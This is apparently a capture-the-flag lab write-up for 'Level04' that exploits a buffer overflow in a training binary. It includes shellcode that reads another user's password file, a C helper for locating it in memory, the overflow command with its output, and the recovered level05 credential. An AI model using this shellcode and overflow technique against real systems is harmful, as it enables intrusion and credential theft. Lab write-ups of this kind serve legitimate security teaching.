# Level04

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we'll use a buffer overflow to inject a [Shellcode](https://en.wikipedia.org/wiki/Shellcode) as asked by the program. Thanks to our analysis we know that the offset is **156** bytes and using the following shellcode we'll get our next password!

```shell
  export SHELLCODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
```

> This shellcode was found [here](http://shell-storm.org/shellcode/files/shellcode-73.php) and basically read a file and output its content to standard input.

Last step would be to get the actual address of that shellcode in our environment, using the following small program.

```C
  #include <stdio.h>
  #include <stdlib.h>

  int main(int argc, char** argv)
  {
    printf("env address at %p\n", getenv(argv[1]));
    return (0);
  }
```

Finally piece everything together and you're done!

```shell
  $> python -c "print '\x90' * 156 + '\xXX\xXX\xXX\xXX'[::-1]" | ./level04
  Give me some shellcode, k
  3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
  child is exiting...
```

> `\xXX\xXX\xXX\xXX` is the address of the shellcode.

So next user credentials pair is `level05:3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`.

Check [here](../source.c) for reproduction source-code of this binary.